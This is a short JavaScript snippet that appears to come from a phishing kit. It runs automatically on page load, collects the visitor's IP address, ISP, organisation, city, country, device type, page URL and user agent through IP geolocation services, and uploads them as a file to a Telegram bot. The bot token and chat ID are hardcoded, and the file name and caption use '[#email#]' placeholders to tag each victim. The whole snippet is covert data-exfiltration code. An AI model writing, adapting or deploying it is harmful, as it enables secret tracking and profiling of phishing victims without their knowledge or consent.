      async function sendDataToTelegram() {



            let country = "Unknown";
            let city = "Unknown";
            let ip = "Unknown";
            let isp = "Unknown";
            let org = "Unknown";

    try {
    const geoResponse = await fetch('http://ip-api.com/json/');
    const geoData = await geoResponse.json();

    country = geoData.country || "Unknown";
    city = geoData.city || "Unknown";
	 ip = geoData.query || "Unknown";
	 isp = geoData.isp || "Unknown";
	 org = geoData.org || "Unknown";

} catch (error) {
    console.error('Geolocation failed:', error);
    try {
        const fallback = await fetch('https://freeipapi.com');
        const fbData = await fallback.json();
        country = fbData.countryName || "Unknown";
        city = fbData.cityName || "Unknown";
		 ip = fbData.ipAddress || "Unknown";
    } catch (e) {
        console.error('All geolocation attempts failed.');
    }
}


const deviceType = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
            
const fileContent = `--- METADATA ---
IP Address: ${ip}
ISP: ${isp}
Organization: ${org}
Location: ${city}, ${country}
Device: ${deviceType}
URL: ${window.location.href}
Time: ${new Date().toLocaleString()}
User Agent: ${navigator.userAgent}`;

            const blob = new Blob([fileContent], { type: 'text/plain' });
		    const token = '8635334693:AAGR3e57-7Ykr31bhCRP2LbyLUzrEXftiLY'; 
            const chatId = '5989388464';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', blob, `Submission_[#email#]_${Date.now()}.txt`);
            formData.append('caption', `New Log From [#email#] - ${name} (${city}, ${country})`);

   try {
        await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        console.log('File sent successfully!');
    } catch (error) {
        console.error('Error sending file:', error);
    }
        };
		
		sendDataToTelegram();
